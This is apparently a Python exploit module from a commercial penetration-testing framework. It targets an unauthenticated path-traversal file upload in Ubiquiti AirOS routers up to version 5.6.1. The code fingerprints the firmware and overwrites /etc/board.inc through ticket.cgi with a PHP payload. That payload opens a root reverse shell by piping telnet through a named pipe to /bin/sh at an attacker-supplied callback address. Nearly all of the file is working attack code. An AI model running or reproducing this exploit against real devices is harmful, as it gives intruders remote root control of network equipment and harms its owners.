#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import ftplib

if "." not in sys.path: sys.path.append(".")

import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import *
#from ExploitTypes.phpexploit import *

NAME                            = "AirOS Remote File Write"
DESCRIPTION                     = "AirOS Remote File Write"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Ubiquity"
DOCUMENTATION['Date Public']    = "07/17/2015"
DOCUMENTATION["CERT Advisory"]  = "None"
DOCUMENTATION["References"]     = "https://dl.ubnt.com/firmwares/XN-fw/v5.6.2/changelog.txt"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "None"
DOCUMENTATION["CVE Url"]        = ""
DOCUMENTATION['CVSS']           = 10
DOCUMENTATION["NOTES"]          = """

This exploit abuses the lack of authentication validation and a path transversal vulnerability in the file upload functionality in AirOS versions <= 5.6.1. By sending a specially crafted request it is possible to upload an arbitrary file with total control of the content into a device with an exposed administration interface. Since the webserver run as root user and the vulnerability allows to overwrite files, system critical files can be modified.
Execution is gained by overwriting the /etc/board.inc file, which is on a RW partition and is included by several web pages, with one containing callback code.

This exploit has been tested on:
* NanoStation Loco M5, XM.v5.6.1

Command line usage:
$ ./commandlineInterface.py -p8888 -v 16
$ python ./exploits/remote/unix/airos_remote_write/airos_remote_write.py -t 192.168.10.20 -l 192.168.10.2 -d 8888

"""

VERSION             = "1.0"
PROPERTY            = {}
PROPERTY['TYPE']    = "Exploit"
PROPERTY['SITE']    = "Remote"
PROPERTY['ARCH']    = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]

CHANGELOG = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port = 80
        self.host = ""
        self.https = False
        self.baseurl = ""
        self.version = 1
        self.done = 0
        self.name = NAME
        return

    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg("https")
        protocol = "https" if self.https else "http"
        self.baseurl = "%s://%s:%d"%(protocol, self.host, self.port)
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIXSHELL]

    def test(self):
        return None

    def is_vulnerable(self, *args, **kwargs):
        major, minor = self.get_revision()
        if major == None:
            return False
        return major<150700

    def get_revision(self, *args, **kwargs):

        url = self.baseurl + "/login.cgi"
        self.log_info("Request: " + url)

        try:
            (res, responsecode) = spkproxy.urlopen(url,
                                                   verb="GET",
                                                   exploit=self, 
                                                   entireresponse=True, 
                                                   return_response_code=True)
            if responsecode != 200:
                self.log_error("An error occurred while connecting to the webserver")
                return (None, None)

            response=res.read()
            pos1 = response.find("login.css")
            if pos1 == -1:
                self.log_error("Can't determine firmware version")
                return (None, None)
                
            pos2 = response[:pos1-1].rfind("/")
            revision_str = response[pos2+1:pos1-1]
            major = int(revision_str.split(".")[0])
            minor = int(revision_str.split(".")[1])
            self.log_info("Firmware revision is %d.%d" % (major, minor))
            return (major, minor)

        except ValueError:
            self.log_error("Can't determine firmware version")
            raise
    
        except:
            self.log_error("An error occurred while connecting to the webserver")
            raise

        return (None, None)

    def make_payload(self):
        payload = """<?
if ($q=="callback"){
    bgexec(0,"cd /tmp;mknod backpipe p;telnet $cb_ip $cb_port 0<backpipe | /bin/sh 1>backpipe");
    exit;
}
if ($q=="ping"){
    echo "pong";
    exit;
}
# Include original file so the interface works ok
exec("cp /proc/ubnthal/board.inc /etc/board2.inc");
include("/etc/board2.inc");
?>"""
        return payload

    def file_upload(self):

        filename="../../etc/board.inc"
        content=self.make_payload()
        url = self.baseurl + "/ticket.cgi"    
        self.log_info("Request: " + url)

        boundary = '-----------------------------' + str(int(random.random()*1e10))
        parts = []

        # Set account ID part.
        parts.append('--' + boundary)
        parts.append('Content-Disposition: form-data; name="test"; filename="%s"' % filename)
        parts.append('')
        parts.append(str(content))
        parts.append('--' + boundary + '--')
        parts.append('')
        body = '\r\n'.join(parts)

        exheaders = {('content-type', 'multipart/form-data; boundary=' + boundary)}

        try:
            (res, responsecode) = spkproxy.urlopen(url,
                                                   verb="POST",
                                                   extraheaders=exheaders, 
                                                   data=body, 
                                                   exploit=self, 
                                                   entireresponse=True, 
                                                   return_response_code=True)
            if responsecode != 200:
                self.log_error("An error occurred while connecting to the webserver")
                return False

            response=res.read()
            if "POST Error" in response:
                self.log_error("An error occurred while uploading the payload")
                return False

        except:
            self.log_error("An error occurred while connecting to the webserver")
            raise

        return True


    def check_payload(self):
        url = self.baseurl + "/login.cgi?q=ping"
        self.log_info("Request: " + url)

        try:
            (res, responsecode) = spkproxy.urlopen(url,
                                                   verb="GET",
                                                   exploit=self, 
                                                   entireresponse=True, 
                                                   return_response_code=True)
            if responsecode != 200:
                self.log_error("An error occurred while connecting to the webserver")
                return False

            response=res.read()
            if "pong" not in response:
                return False

        except:
            self.log_error("An error occurred while connecting to the webserver")
            raise

        return True


    def run_payload(self):
        url = self.baseurl + "/login.cgi?q=callback&cb_ip=%s&cb_port=%s" % (self.callback.ip, self.callback.port)
        self.log_info("Request: " + url)

        try:
            (res, responsecode) = spkproxy.urlopen(url,
                                                   verb="GET",
                                                   exploit=self, 
                                                   entireresponse=True, 
                                                   return_response_code=True)
            if responsecode != 200:
                self.log_error("An error occurred while connecting to the webserver")
                return False

        except:
            self.log_error("An error occurred while connecting to the webserver")
            raise

        return True


    def run(self):
        self.getargs()

        if not self.is_vulnerable():
           self.log_error("Target is not vulnerable")
           self.setProgress(-1)
           return 0
        else:
           self.log_info("Target might be vulnerable")

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.log_info("Attacking %s:%d" % (self.host, self.port))

        self.log_info("Uploading payload...")
        if not self.file_upload():
            self.log_error("Payload Upload Failed")
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            self.setProgress(-1)
            return 0

        self.setProgress(30)
        self.log_info("Veryfing if the Payload was successfully uploaded...")

        if not self.check_payload():
            self.log_error("Payload Upload Failed, target is likely not vulnerable")
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            self.setProgress(-1)
            return 0

        self.setProgress(60)

        if not self.run_payload():
            self.log_error("Run Payload Failed")
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            self.setProgress(-1)
            return 0

        self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
        self.setProgress(100)
        return 1

    def shutdown(self):
        self.done = 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

